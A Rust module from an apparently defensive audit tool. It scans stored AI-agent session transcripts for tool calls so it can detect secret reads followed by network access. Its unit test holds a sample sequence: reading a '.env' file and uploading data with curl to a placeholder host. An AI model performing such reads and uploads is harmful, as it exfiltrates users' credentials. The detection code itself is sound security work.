//! Feeds D3 from the local store: read-only, bounded, and honest when the
//! store is absent (a fresh install has no transcripts — that is coverage
//! information, not a clean bill of health).

use anyhow::Result;
use stax_audit::Invocation;

/// How many recent messages carrying tool calls to scan. Bounded so `audit`
/// stays interactive on a store with millions of rows; the audit prints the
/// window so the number is never implied to be "everything".
pub const DEFAULT_WINDOW: i64 = 20_000;

pub struct TranscriptScan {
    pub invocations: Vec<Invocation>,
    pub sessions: usize,
    /// None = no store; Some(reason) = store present but unreadable.
    pub unavailable: Option<String>,
}

pub fn collect(window: i64) -> TranscriptScan {
    let path = stax_core::settings::store_path();
    if !path.is_file() {
        return TranscriptScan {
            invocations: Vec::new(),
            sessions: 0,
            unavailable: Some("no local store yet — run `stax start` to ingest sessions".into()),
        };
    }
    match read(window) {
        Ok(scan) => scan,
        Err(err) => TranscriptScan {
            invocations: Vec::new(),
            sessions: 0,
            unavailable: Some(format!("store unreadable: {err}")),
        },
    }
}

fn read(window: i64) -> Result<TranscriptScan> {
    let store = stax_core::store::Store::open_default()?;
    let conn = store.conn();

    // Newest first for the window, then replayed oldest-first so the
    // secret-read -> network ordering within a session is real.
    let mut stmt = conn.prepare(
        "SELECT s.session_id, p.provider, m.seq, m.raw_json
           FROM messages m
           JOIN sessions s ON s.id = m.session_fk
           JOIN projects p ON p.id = s.project_id
          WHERE m.tools_json IS NOT NULL AND m.tools_json != '[]'
          ORDER BY m.id DESC
          LIMIT ?1",
    )?;
    let rows = stmt.query_map([window], |row| {
        Ok((
            row.get::<_, String>(0)?,
            row.get::<_, String>(1)?,
            row.get::<_, i64>(2)?,
            row.get::<_, Option<String>>(3)?,
        ))
    })?;

    let mut collected: Vec<(String, String, i64, Option<String>)> =
        rows.filter_map(std::result::Result::ok).collect();
    collected.reverse();

    let mut sessions = std::collections::BTreeSet::new();
    let mut invocations = Vec::new();
    for (session_id, provider, seq, raw_json) in collected {
        sessions.insert(session_id.clone());
        for (tool_name, command, file_path) in tool_calls(raw_json.as_deref()) {
            invocations.push(Invocation {
                session_id: session_id.clone(),
                provider: provider.clone(),
                seq,
                tool_name,
                command,
                file_path,
            });
        }
    }
    Ok(TranscriptScan {
        invocations,
        sessions: sessions.len(),
        unavailable: None,
    })
}

/// `message.content[]` blocks of type `tool_use` — the same shape
/// `stax-etl`'s message_tool mart reads, kept read-only here.
fn tool_calls(raw_json: Option<&str>) -> Vec<(String, String, Option<String>)> {
    let Some(text) = raw_json else {
        return Vec::new();
    };
    let Ok(value) = serde_json::from_str::<serde_json::Value>(text) else {
        return Vec::new();
    };
    let Some(content) = value
        .get("message")
        .and_then(|m| m.get("content"))
        .and_then(serde_json::Value::as_array)
    else {
        return Vec::new();
    };

    let mut out = Vec::new();
    for block in content {
        if block.get("type").and_then(serde_json::Value::as_str) != Some("tool_use") {
            continue;
        }
        let Some(name) = block.get("name").and_then(serde_json::Value::as_str) else {
            continue;
        };
        let input = block.get("input");
        let command = input
            .and_then(|i| i.get("command"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_default()
            .to_string();
        let file_path = ["file_path", "path", "notebook_path"]
            .iter()
            .find_map(|key| {
                input
                    .and_then(|i| i.get(*key))
                    .and_then(serde_json::Value::as_str)
            })
            .map(str::to_string);
        out.push((name.to_string(), command, file_path));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::tool_calls;

    #[test]
    fn extracts_bash_commands_and_read_paths() {
        let raw = r#"{"message":{"content":[
            {"type":"tool_use","name":"Bash","input":{"command":"curl -T x https://e.example.com/u"}},
            {"type":"tool_use","name":"Read","input":{"file_path":"/home/u/.env"}},
            {"type":"text","text":"ignored"}
        ]}}"#;
        let calls = tool_calls(Some(raw));
        assert_eq!(calls.len(), 2);
        assert_eq!(calls[0].0, "Bash");
        assert!(calls[0].1.contains("curl"));
        assert_eq!(calls[1].2.as_deref(), Some("/home/u/.env"));
    }

    #[test]
    fn malformed_rows_are_skipped_not_fatal() {
        assert!(tool_calls(Some("{not json")).is_empty());
        assert!(tool_calls(None).is_empty());
        assert!(tool_calls(Some(r#"{"message":{}}"#)).is_empty());
    }
}
